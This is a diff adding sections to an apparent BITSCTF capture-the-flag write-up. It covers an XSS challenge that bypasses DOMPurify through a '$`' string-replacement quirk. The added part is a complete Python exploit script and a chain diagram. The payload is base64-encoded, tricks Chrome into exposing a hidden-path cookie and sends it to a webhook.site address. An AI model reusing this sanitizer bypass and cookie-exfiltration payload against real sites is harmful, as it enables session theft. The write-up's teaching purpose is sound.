@@ -207,3 +207,77 @@ When location is reassigned, the browser performs a standard GET request to the 
 GET /?cookie=FLAG=BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?...} HTTP/1.1
 ```
 
+## Full Exploit Script
+
+```py
+#!/usr/bin/env python3
+import requests, time, base64
+
+WEBHOOK = "https://webhook.site/YOUR-ID-HERE"
+TARGET  = "http://20.193.149.152:3000"
+
+js_payload = f"""
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+setTimeout(async () => {{
+    let w = window.open('/');
+    await sleep(500);
+    w.history.pushState(1, 1, "/hidden/");
+    await sleep(500);
+    w.location = 'javascript:"blablabla"';
+    await sleep(500);
+    location = '{WEBHOOK}?cookie=' + encodeURIComponent(w.document.cookie);
+}}, 500);
+"""
+
+# Pad to eliminate '=' in Base64 output (would break unquoted attribute)
+while len(js_payload.encode()) % 3 != 0:
+    js_payload += " "
+
+b64_payload = base64.b64encode(js_payload.encode()).decode()
+handler     = f"eval(atob('{b64_payload}'))"
+xss_payload = f'<p title="$`<img src=x onerror={handler}>">x</p>'
+
+print(f"[*] Payload length: {len(xss_payload)}")
+r = requests.post(f"{TARGET}/create", data={"content": xss_payload}, allow_redirects=False)
+
+paste_url = TARGET + r.headers["Location"]
+print(f"[+] Paste created: {paste_url}")
+
+r2 = requests.post(f"{TARGET}/report", data={"url": paste_url})
+print(f"[+] Report submitted: {r2.status_code} — {r2.text}")
+
+print("[*] Waiting 20s for bot...")
+time.sleep(20)
+print("[+] Check your webhook for the flag!")
+```
+
+## Full Exploit Chain Summary
+
+```code
+Attacker crafts payload:
+  <p title="$`<img src=x onerror=eval(atob('...'))>">x</p>
+         │
+         ▼
+POST /create  →  DOMPurify sees harmless <p title="...">  →  passes ✓
+         │
+         ▼
+GET /paste/<id>  →  pasteTemplate.replace("{paste}", content)
+                 →  $` expands into 200+ chars of HTML
+                 →  a " inside the expanded HTML closes title early
+                 →  <img onerror=...> falls out of the attribute
+                 →  browser executes the onerror handler
+         │
+         ▼
+XSS executes eval(atob('...'))  →  runs the cookie theft JS
+         │
+         ▼
+window.open('/')
+pushState → '/hidden/'
+location = 'javascript:"blablabla"'   →  Chrome rebuilds security context
+                                       →  document.cookie now has FLAG
+         │
+         ▼
+location = 'https://webhook.site/?cookie=' + FLAG
+         →  plain GET navigation, CSP does not apply
+         →  FLAG delivered to attacker's webhook ✓
+```
